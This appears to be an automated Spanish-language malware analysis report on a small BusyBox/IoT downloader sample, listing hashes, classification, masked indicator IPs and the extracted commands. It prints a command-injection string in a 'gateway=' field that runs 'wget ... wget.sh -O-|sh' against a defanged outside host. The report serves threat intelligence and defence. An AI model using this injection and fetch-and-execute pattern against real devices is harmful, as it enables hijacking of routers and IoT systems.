# 🧬 Payload Analysis

`d5ffc3a8acb26812c64b4e0b4de8bae70966a16b1535c7b1e8408888665d8876`

## 📌 Resumen

Texto ASCII de 329 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
2. `sh -s wdr2`
3. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/d5ffc3a8acb26812c64b4e0b4de8bae70966a16b1535c7b1e8408888665d8876.md](../../../../../malware-like/oraculo/downloader/d5ffc3a8acb26812c64b4e0b4de8bae70966a16b1535c7b1e8408888665d8876.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d5ffc3a8acb26812c64b4e0b4de8bae70966a16b1535c7b1e8408888665d8876`
- **MD5:** `b3c3d1c5f09fa93c25debb999854adac`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 329 B |
| Entropía | 5.13 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
gateway=[internal-ip-redacted]`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wdr2;busybox wget hxxp://91.92.40.XXX/wget.sh -O-
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.175.XXX | static_analysis |
| command | gateway=[internal-ip-redacted]`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wdr2;busybox wget hxxp://91.92.40.XXX/wget.sh -O- | strings |
| hash | d5ffc3a8acb26812c64b4e0b4de8bae70966a16b1535c7b1e8408888665d8876 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
